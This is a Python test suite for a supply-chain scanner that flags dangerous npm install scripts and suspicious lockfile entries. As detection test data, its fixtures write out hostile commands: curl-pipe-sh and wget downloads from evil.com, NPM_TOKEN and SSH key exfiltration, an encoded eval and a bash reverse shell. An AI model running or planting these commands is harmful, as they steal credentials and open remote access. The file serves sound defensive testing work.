#!/usr/bin/env python3
"""
Tests for the Supply Chain Security Module.

Covers:
- Install script analysis (dangerous and suspicious patterns)
- Lockfile integrity checks (package-lock.json and yarn.lock)
- Registry mismatch detection
- Git dependency detection
"""

import pytest
import sys
import os
import json
import tempfile
import shutil

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from njordscan.modules.supply_chain import SupplyChainModule
from njordscan.vulnerability import VulnerabilityIdGenerator


class FakeConfig:
    """Minimal config stub for tests."""
    framework = 'nextjs'
    verbose = False


@pytest.fixture
def module():
    return SupplyChainModule(FakeConfig(), VulnerabilityIdGenerator())


@pytest.fixture
def tmp_project(tmp_path):
    """Returns a temporary project directory."""
    return tmp_path


def write_package_json(path, data):
    with open(path / 'package.json', 'w') as f:
        json.dump(data, f)


def write_package_lock(path, data):
    with open(path / 'package-lock.json', 'w') as f:
        json.dump(data, f)


def write_yarn_lock(path, content):
    with open(path / 'yarn.lock', 'w') as f:
        f.write(content)


# ===================================================================== #
#  Install Script Analysis
# ===================================================================== #

class TestInstallScriptAnalysis:

    def test_no_package_json(self, module, tmp_project):
        """No package.json -> no findings."""
        vulns = module._scan_install_scripts(tmp_project)
        assert vulns == []

    def test_safe_scripts(self, module, tmp_project):
        """Normal scripts should not trigger findings."""
        write_package_json(tmp_project, {
            "name": "safe-project",
            "scripts": {
                "start": "node server.js",
                "build": "webpack --mode production",
                "test": "jest --coverage",
                "lint": "eslint src/"
            }
        })
        vulns = module._scan_install_scripts(tmp_project)
        assert len(vulns) == 0

    def test_curl_pipe_sh_in_postinstall(self, module, tmp_project):
        """curl | sh in postinstall is critical."""
        write_package_json(tmp_project, {
            "name": "malicious-pkg",
            "scripts": {
                "postinstall": "curl https://evil.com/payload.sh | sh"
            }
        })
        vulns = module._scan_install_scripts(tmp_project)
        assert len(vulns) >= 1
        assert vulns[0].severity.value == 'critical'
        assert vulns[0].vuln_type == 'malicious_install_script'
        assert vulns[0].metadata['auto_run'] is True

    def test_wget_in_preinstall(self, module, tmp_project):
        """wget in preinstall is critical."""
        write_package_json(tmp_project, {
            "name": "malicious-pkg",
            "scripts": {
                "preinstall": "wget https://evil.com/backdoor -O /tmp/bd"
            }
        })
        vulns = module._scan_install_scripts(tmp_project)
        assert len(vulns) >= 1
        assert vulns[0].severity.value == 'critical'

    def test_eval_in_install(self, module, tmp_project):
        """eval in install script is critical."""
        write_package_json(tmp_project, {
            "name": "eval-pkg",
            "scripts": {
                "install": "eval $(echo ZWNobyBIYWNrZWQ= | base64 -d)"
            }
        })
        vulns = module._scan_install_scripts(tmp_project)
        assert len(vulns) >= 1
        assert any(v.vuln_type == 'malicious_install_script' for v in vulns)

    def test_env_access_in_postinstall(self, module, tmp_project):
        """Accessing process.env during install is dangerous."""
        write_package_json(tmp_project, {
            "name": "env-stealer",
            "scripts": {
                "postinstall": "node -e \"require('http').get('http://evil.com/?t='+process.env.NPM_TOKEN)\""
            }
        })
        vulns = module._scan_install_scripts(tmp_project)
        assert len(vulns) >= 1

    def test_ssh_access_in_postinstall(self, module, tmp_project):
        """Accessing .ssh directory during install is dangerous."""
        write_package_json(tmp_project, {
            "name": "ssh-stealer",
            "scripts": {
                "postinstall": "cat ~/.ssh/id_rsa | curl -X POST -d @- https://evil.com"
            }
        })
        vulns = module._scan_install_scripts(tmp_project)
        assert len(vulns) >= 1
        assert vulns[0].severity.value == 'critical'

    def test_reverse_shell_in_install(self, module, tmp_project):
        """Reverse shell pattern in install is critical."""
        write_package_json(tmp_project, {
            "name": "shell-pkg",
            "scripts": {
                "install": "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
            }
        })
        vulns = module._scan_install_scripts(tmp_project)
        assert len(vulns) >= 1
        assert vulns[0].severity.value == 'critical'

    def test_dangerous_non_auto_run_is_high(self, module, tmp_project):
        """Dangerous patterns in non-auto-run scripts should be high (not critical)."""
        write_package_json(tmp_project, {
            "name": "custom-script",
            "scripts": {
                "deploy": "curl https://evil.com/payload.sh | sh"
            }
        })
        vulns = module._scan_install_scripts(tmp_project)
        assert len(vulns) >= 1
        assert vulns[0].severity.value == 'high'
        assert vulns[0].metadata['auto_run'] is False

    def test_suspicious_http_url_in_postinstall(self, module, tmp_project):
        """HTTP URLs in auto-run scripts are suspicious."""
        write_package_json(tmp_project, {
            "name": "url-pkg",
            "scripts": {
                "postinstall": "node setup.js https://example.com/config"
            }
        })
        vulns = module._scan_install_scripts(tmp_project)
        assert len(vulns) >= 1
        assert vulns[0].vuln_type == 'suspicious_install_script'

    def test_child_process_in_postinstall(self, module, tmp_project):
        """child_process usage in auto-run scripts is suspicious."""
        write_package_json(tmp_project, {
            "name": "child-pkg",
            "scripts": {
                "postinstall": "node -e \"require('child_process').execSync('echo hi')\""
            }
        })
        vulns = module._scan_install_scripts(tmp_project)
        assert len(vulns) >= 1

    def test_no_scripts_section(self, module, tmp_project):
        """Package with no scripts section should have no findings."""
        write_package_json(tmp_project, {
            "name": "no-scripts",
            "version": "1.0.0"
        })
        vulns = module._scan_install_scripts(tmp_project)
        assert vulns == []


# ===================================================================== #
#  Lockfile Integrity - package-lock.json
# ===================================================================== #

class TestPackageLockIntegrity:

    def test_no_lockfile(self, module, tmp_project):
        """No lockfile -> no findings."""
        vulns = module._scan_lockfile_integrity(tmp_project)
        assert vulns == []

    def test_healthy_lockfile(self, module, tmp_project):
        """Lockfile with integrity hashes and standard registry -> no findings."""
        write_package_lock(tmp_project, {
            "name": "good-project",
            "lockfileVersion": 2,
            "packages": {
                "": {"name": "good-project", "version": "1.0.0"},
                "node_modules/lodash": {
                    "version": "4.17.21",
                    "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
                    "integrity": "sha512-v2kDE0/KDa7CNjEZGHPA=="
                },
                "node_modules/express": {
                    "version": "4.18.2",
                    "resolved": "https://registry.npmjs.org/express/-/express-4.18.2.tgz",
                    "integrity": "sha512-abc123def456=="
                }
            }
        })
        vulns = module._scan_lockfile_integrity(tmp_project)
        assert len(vulns) == 0

    def test_missing_integrity_hashes(self, module, tmp_project):
        """Packages without integrity hashes should be flagged."""
        write_package_lock(tmp_project, {
            "name": "no-hashes",
            "lockfileVersion": 2,
            "packages": {
                "": {"name": "no-hashes", "version": "1.0.0"},
                "node_modules/lodash": {
                    "version": "4.17.21",
                    "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz"
                },
                "node_modules/express": {
                    "version": "4.18.2",
                    "resolved": "https://registry.npmjs.org/express/-/express-4.18.2.tgz"
                }
            }
        })
        vulns = module._scan_lockfile_integrity(tmp_project)
        integrity_vulns = [v for v in vulns if v.vuln_type == 'lockfile_integrity']
        assert len(integrity_vulns) == 1
        assert integrity_vulns[0].metadata['missing_integrity_count'] == 2

    def test_non_standard_registry(self, module, tmp_project):
        """Packages from non-standard registries should be flagged."""
        write_package_lock(tmp_project, {
            "name": "bad-registry",
            "lockfileVersion": 2,
            "packages": {
                "": {"name": "bad-registry", "version": "1.0.0"},
                "node_modules/evil-pkg": {
                    "version": "1.0.0",
                    "resolved": "https://evil-registry.com/evil-pkg/-/evil-pkg-1.0.0.tgz",
                    "integrity": "sha512-abc=="
                }
            }
        })
        vulns = module._scan_lockfile_integrity(tmp_project)
        registry_vulns = [v for v in vulns if v.vuln_type == 'lockfile_registry_mismatch']
        assert len(registry_vulns) == 1
        assert registry_vulns[0].severity.value == 'high'

    def test_git_dependency(self, module, tmp_project):
        """Git dependencies should be flagged."""
        write_package_lock(tmp_project, {
            "name": "git-deps",
            "lockfileVersion": 2,
            "packages": {
                "": {"name": "git-deps", "version": "1.0.0"},
                "node_modules/private-lib": {
                    "version": "1.0.0",
                    "resolved": "git+https://github.com/user/private-lib.git#abc123",
                    "integrity": "sha512-def=="
                }
            }
        })
        vulns = module._scan_lockfile_integrity(tmp_project)
        git_vulns = [v for v in vulns if v.vuln_type == 'lockfile_git_dependency']
        assert len(git_vulns) == 1

    def test_lockfile_v1_format(self, module, tmp_project):
        """Lockfile v1 (dependencies key) should also be analyzed."""
        write_package_lock(tmp_project, {
            "name": "v1-project",
            "lockfileVersion": 1,
            "dependencies": {
                "lodash": {
                    "version": "4.17.21",
                    "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz"
                }
            }
        })
        vulns = module._scan_lockfile_integrity(tmp_project)
        # Should detect missing integrity hash
        integrity_vulns = [v for v in vulns if v.vuln_type == 'lockfile_integrity']
        assert len(integrity_vulns) == 1

    def test_multiple_issues_combined(self, module, tmp_project):
        """Multiple issues in one lockfile should all be reported."""
        write_package_lock(tmp_project, {
            "name": "multi-issue",
            "lockfileVersion": 2,
            "packages": {
                "": {"name": "multi-issue", "version": "1.0.0"},
                "node_modules/no-hash": {
                    "version": "1.0.0",
                    "resolved": "https://registry.npmjs.org/no-hash/-/no-hash-1.0.0.tgz"
                },
                "node_modules/evil": {
                    "version": "1.0.0",
                    "resolved": "https://evil.com/evil-1.0.0.tgz",
                    "integrity": "sha512-abc=="
                },
                "node_modules/git-pkg": {
                    "version": "1.0.0",
                    "resolved": "git+https://github.com/user/repo.git#main",
                    "integrity": "sha512-xyz=="
                }
            }
        })
        vulns = module._scan_lockfile_integrity(tmp_project)
        types_found = {v.vuln_type for v in vulns}
        assert 'lockfile_integrity' in types_found
        assert 'lockfile_registry_mismatch' in types_found
        assert 'lockfile_git_dependency' in types_found


# ===================================================================== #
#  Lockfile Integrity - yarn.lock
# ===================================================================== #

class TestYarnLockIntegrity:

    def test_healthy_yarn_lock(self, module, tmp_project):
        """Yarn lock with integrity and standard registry -> no findings."""
        write_yarn_lock(tmp_project, """# yarn lockfile v1

lodash@^4.17.0:
  version "4.17.21"
  resolved "https://registry.yarnpkg.com/lodash/-/lodash-4.17.21.tgz#abc123"
  integrity sha512-v2kDE0abc==
""")
        vulns = module._scan_lockfile_integrity(tmp_project)
        assert len(vulns) == 0

    def test_yarn_lock_missing_integrity(self, module, tmp_project):
        """Yarn lock entries without integrity should be flagged."""
        write_yarn_lock(tmp_project, """# yarn lockfile v1

lodash@^4.17.0:
  version "4.17.21"
  resolved "https://registry.yarnpkg.com/lodash/-/lodash-4.17.21.tgz#abc123"
""")
        vulns = module._scan_lockfile_integrity(tmp_project)
        integrity_vulns = [v for v in vulns if v.vuln_type == 'lockfile_integrity']
        assert len(integrity_vulns) == 1

    def test_yarn_lock_non_standard_registry(self, module, tmp_project):
        """Yarn lock with non-standard registry should be flagged."""
        write_yarn_lock(tmp_project, """# yarn lockfile v1

evil-pkg@^1.0.0:
  version "1.0.0"
  resolved "https://evil-registry.com/evil-pkg-1.0.0.tgz#abc"
  integrity sha512-abc==
""")
        vulns = module._scan_lockfile_integrity(tmp_project)
        registry_vulns = [v for v in vulns if v.vuln_type == 'lockfile_registry_mismatch']
        assert len(registry_vulns) == 1


# ===================================================================== #
#  Full scan integration
# ===================================================================== #

class TestFullScan:

    def test_scan_empty_dir(self, module, tmp_project):
        """Scanning empty directory should return no findings."""
        import asyncio
        vulns = asyncio.run(module.scan(str(tmp_project)))
        assert vulns == []

    def test_scan_url_returns_empty(self, module):
        """URL targets should return empty (not supported by this module)."""
        import asyncio
        vulns = asyncio.run(module.scan("https://example.com"))
        assert vulns == []

    def test_scan_nonexistent_path(self, module):
        """Non-existent path should return empty."""
        import asyncio
        vulns = asyncio.run(module.scan("/nonexistent/path/xyz"))
        assert vulns == []

    def test_scan_combines_script_and_lockfile(self, module, tmp_project):
        """Full scan should find both install script and lockfile issues."""
        import asyncio
        write_package_json(tmp_project, {
            "name": "combined-test",
            "scripts": {
                "postinstall": "curl https://evil.com/setup.sh | sh"
            }
        })
        write_package_lock(tmp_project, {
            "name": "combined-test",
            "lockfileVersion": 2,
            "packages": {
                "": {"name": "combined-test", "version": "1.0.0"},
                "node_modules/pkg": {
                    "version": "1.0.0",
                    "resolved": "https://evil-registry.com/pkg-1.0.0.tgz",
                    "integrity": "sha512-abc=="
                }
            }
        })
        vulns = asyncio.run(module.scan(str(tmp_project)))
        types_found = {v.vuln_type for v in vulns}
        assert 'malicious_install_script' in types_found
        assert 'lockfile_registry_mismatch' in types_found

    def test_should_run_static(self, module):
        assert module.should_run('static') is True

    def test_should_run_full(self, module):
        assert module.should_run('full') is True

    def test_should_not_run_dynamic(self, module):
        assert module.should_run('dynamic') is False


# ===================================================================== #
#  Module registration
# ===================================================================== #

class TestModuleRegistration:

    def test_module_in_registry(self):
        from njordscan.modules import MODULE_REGISTRY
        assert 'supply_chain' in MODULE_REGISTRY

    def test_module_metadata_exists(self):
        from njordscan.modules import MODULE_METADATA
        assert 'supply_chain' in MODULE_METADATA
        assert MODULE_METADATA['supply_chain']['category'] == 'dependencies'

    def test_module_available(self):
        from njordscan.modules import is_module_available
        assert is_module_available('supply_chain') is True


# ===================================================================== #
#  Vulnerability types registration
# ===================================================================== #

class TestVulnerabilityTypes:

    def test_supply_chain_vuln_types_exist(self):
        from njordscan.vulnerability_types import VulnerabilityType
        assert hasattr(VulnerabilityType, 'MALICIOUS_INSTALL_SCRIPT')
        assert hasattr(VulnerabilityType, 'LOCKFILE_INTEGRITY')
        assert hasattr(VulnerabilityType, 'SUSPICIOUS_INSTALL_SCRIPT')
        assert hasattr(VulnerabilityType, 'LOCKFILE_REGISTRY_MISMATCH')
        assert hasattr(VulnerabilityType, 'LOCKFILE_GIT_DEPENDENCY')

    def test_supply_chain_types_in_registry(self):
        from njordscan.vulnerability_types import (
            vulnerability_type_registry, VulnerabilityType
        )
        info = vulnerability_type_registry.get_type_info(
            VulnerabilityType.MALICIOUS_INSTALL_SCRIPT
        )
        assert info is not None
        assert info.category.value == "A08:2021 - Software and Data Integrity Failures"
